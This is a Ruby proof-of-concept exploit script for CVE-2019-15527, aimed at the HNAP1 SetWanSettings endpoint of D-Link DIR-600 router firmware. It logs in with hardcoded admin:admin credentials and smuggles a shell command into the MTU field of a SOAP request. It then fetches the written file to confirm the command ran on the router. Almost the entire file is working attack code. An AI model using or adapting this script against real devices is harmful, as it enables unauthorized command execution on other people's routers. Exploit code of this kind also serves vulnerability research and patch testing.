CVE-2019-15527.rb

#!/usr/bin/env ruby
# CVE-2019-15527 /HNAP1/SetWanSettings
# tested against DIR600B_FW205b01.bin
require 'rex'

begin

sock = Rex::Proto::Http::Client.new('', 
                                    port = '', 
                                    context = {}, 
                                    ssl = false)

xml = %Q|
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <soap:Body>
    <SetWanSettings xmlns="http://purenetworks.com/HNAP1/">
      <Type>Static</Type>
      <Username></Username>
      <Password></Password>
      <MaxIdleTime></MaxIdleTime>
      <ServiceName></ServiceName>
      <AutoReconnect></AutoReconnect>
      <IPAddress>1.1.1.1</IPAddress>
      <SubnetMask>255.255.255.0</SubnetMask>
      <Gateway>1.1.1.1</Gateway>
      <DNS>
        <Primary>1.1.1.1</Primary>
        <Secondary>1.1.1.1</Secondary>
      </DNS>
      <MacAddress>11:11:11:11:11:11</MacAddress>
      <MTU>1400;`uname -a > ../../www/lolli.txt`</MTU>
    </SetWanSettings>
  </soap:Body>
</soap:Envelope>
|

req = sock.request_cgi(
{
	'uri'   => '/HNAP1/',
	'version' => '1.1',
	'method' => 'POST',
              'data' => xml,
              'headers' => {
               # hardcoded
               'Authorization' => 'Basic ' + Rex::Text.encode_base64('admin:admin'), 
               'SOAPAction' => 'http://purenetworks.com/HNAP1/SetWanSettings',
              },
})

sock.send_request(req)
data = sock.read_response()

 if data and data.body.include?('OK')
  puts '[*] Good'
  req = sock.request_raw({'uri' => '/lolli.txt',})
  sock.send_request(req)
  data = sock.read_response()
  puts data.body
 else
  puts '[!] Error'
 end
rescue => e
puts '[!] ' + e.to_s
end
